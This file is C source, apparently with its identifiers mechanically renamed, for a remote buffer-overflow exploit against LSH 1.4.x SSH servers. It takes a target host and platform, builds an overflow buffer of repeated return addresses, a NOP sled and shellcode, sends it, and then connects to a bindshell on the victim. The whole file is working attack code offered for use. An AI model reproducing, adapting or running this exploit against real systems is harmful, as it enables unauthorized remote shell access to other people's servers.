
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {char* platform; int retAddr; } ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 size_t FUNC_0 (int ) ;
 scalar_t__ VAR_4 ;
 int FUNC_1 (int) ;
 int FUNC_2 (int ) ;
 int FUNC_3 () ;
 int FUNC_4 (int) ;
 int * FUNC_5 (char*) ;
 int FUNC_6 (int,char**,char*) ;
 char* VAR_5 ;
 int * VAR_6 ;
 int FUNC_7 (char*,int ,int) ;
 int FUNC_8 (int) ;
 int FUNC_9 (int,scalar_t__) ;
 int FUNC_10 (int) ;
 int VAR_7 ;
 int FUNC_11 (char*,...) ;
 int VAR_8 ;
 int FUNC_12 (int ) ;
 int FUNC_13 (char*,int ,int ) ;
 TYPE_1__* VAR_9 ;
 char* VAR_10 ;
 size_t VAR_11 ;

FUNC_14(int VAR_12, char **VAR_13)
{
 int VAR_14, VAR_15, VAR_16;
 unsigned long *VAR_17;
 char *VAR_18;

 FUNC_11("LSH 1.4.x (others?) exploit by Haggis (haggis@haggis.kicks-ass.net)\n\n");
 while((VAR_14=FUNC_6(VAR_12, VAR_13, "t:T:h"))!=-1) {
  switch(VAR_14) {
   case 't':
    FUNC_13(VAR_5, VAR_7, VAR_2-1);
    break;
   case 'T':
    VAR_11=FUNC_0(VAR_7);
    break;
   case 'h':
   default:
    FUNC_11("%s\n",VAR_10);
    FUNC_11("Available platforms:\n");
    for(VAR_15=0;VAR_9[VAR_15].platform;VAR_15++)
     FUNC_11(" %2d. %s\n", VAR_15, VAR_9[VAR_15].platform);
    FUNC_11("\n");
    FUNC_4(0);
    break;
  }
 }

 if(VAR_5[0]=='\0') {
  FUNC_11("[*] You must specify a host! Use -h for help\n");
  FUNC_4(1);
 }
 if((VAR_6=FUNC_5(VAR_5))==((void*)0)) {
  FUNC_11("[*] Couldn't resolve host %s\nUse '%s -h' for help\n", VAR_5,VAR_13[0]);
  FUNC_4(1);
 }
 if((VAR_16=FUNC_2(VAR_3))==-1) {
  FUNC_11("[*] Coulnd't connect to host %s\n", VAR_5);
  FUNC_4(1);
 }
 FUNC_8(VAR_16);

 FUNC_11("[-] Building exploit buffer...\n");

 VAR_17=(unsigned long *)VAR_4;
 for(VAR_15=0;VAR_15<VAR_0/4;VAR_15++)
  *(VAR_17++)=VAR_9[VAR_11].retAddr;

 VAR_18=(unsigned char *)VAR_17;
 for(VAR_15=0;VAR_15<VAR_1-FUNC_12(VAR_8);VAR_15++)
  *(VAR_18++)=(unsigned long)0x90;

 FUNC_7(VAR_18, VAR_8, FUNC_12(VAR_8));
 *(VAR_18+FUNC_12(VAR_8))='\n';
 *(VAR_18+FUNC_12(VAR_8)+1)='\0';

 FUNC_11("[-] Sending exploit string...\n");
 FUNC_9(VAR_16, VAR_4);
 FUNC_1(VAR_16);

 FUNC_11("[-] Sleeping...\n");
 FUNC_10(100000);

 FUNC_11("[-] Connecting to bindshell...\n");
 if(FUNC_3()==-1)
  FUNC_11("[*] Could not connect to %s - the exploit failed\n", VAR_5);

 FUNC_4(0);
}
